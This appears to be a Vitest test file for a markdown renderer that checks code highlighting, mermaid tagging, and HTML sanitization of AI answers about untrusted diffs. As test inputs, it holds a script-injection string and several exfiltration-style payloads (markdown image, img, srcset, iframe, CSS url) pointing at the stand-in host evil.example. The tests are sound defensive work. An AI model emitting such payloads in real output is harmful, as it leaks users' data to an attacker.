// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { html, modelHtml } from "./render";

describe("html (markdown rendering)", () => {
  it("highlights fenced code in a registered language", () => {
    const out = html("```ts\nconst n: number = 1;\n```");
    expect(out).toContain('class="hljs"');
    expect(out).toContain("hljs-keyword"); // `const` got a token span
    expect(out).toContain("hljs-number");
  });

  it("renders unregistered languages as plain escaped code", () => {
    const out = html("```brainfuck\n<+>\n```");
    expect(out).toContain('class="hljs"');
    expect(out).not.toContain("hljs-keyword");
    expect(out).toContain("&lt;+&gt;"); // escaped, not interpreted as HTML
  });

  it("sanitizes script injection", () => {
    const out = html('hello <script>alert(1)</script> <img src=x onerror="x">');
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("onerror");
  });
});

it("tags mermaid fences for client-side rendering instead of highlighting", () => {
  const out = html("```mermaid\nflowchart LR\n  A[App] <--> B[Server]\n```");
  expect(out).toContain('class="rd-mermaid"');
  expect(out).toContain("A[App] &lt;--&gt; B[Server]"); // escaped, still readable
  expect(out).not.toContain("hljs-");
});

describe("modelHtml (answers about untrusted diffs)", () => {
  it("loads nothing remote: no images, media, frames or style urls", () => {
    const out = modelHtml([
      "Answer ![x](https://evil.example/leak?d=secret)",
      '<img src="https://evil.example/a"> <picture><source srcset="https://evil.example/b"></picture>',
      '<video poster="https://evil.example/c"></video> <svg><image href="https://evil.example/d"/></svg>',
      '<p style="background:url(https://evil.example/e)">styled</p> <iframe src="https://evil.example/f"></iframe>',
    ].join("\n\n"));
    expect(out).not.toContain("evil.example");
    expect(out).toContain("Answer");
    expect(out).toContain("styled");
  });

  it("keeps the text formatting answers use", () => {
    const out = modelHtml("**Bold**, `code`, and a [link](https://github.com/o/r/pull/9).\n\n- one\n- two");
    expect(out).toContain("<strong>Bold</strong>");
    expect(out).toContain("<code>code</code>");
    expect(out).toContain('href="https://github.com/o/r/pull/9"');
    expect(out).toContain("<li>two</li>");
  });
});
